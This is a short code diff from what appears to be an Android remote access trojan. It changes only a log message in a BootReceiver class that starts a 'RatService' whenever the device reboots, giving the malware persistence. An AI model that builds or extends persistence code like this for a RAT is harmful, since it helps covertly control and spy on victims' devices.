@@ -9,7 +9,7 @@ public class BootReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-            Log.d("BootReceiver", "Device rebooted, starting RAT service");
+            Log.d("BootReceiver", "📱 Device rebooted - Starting RAT");
             Intent serviceIntent = new Intent(context, RatService.class);
             context.startForegroundService(serviceIntent);
         }
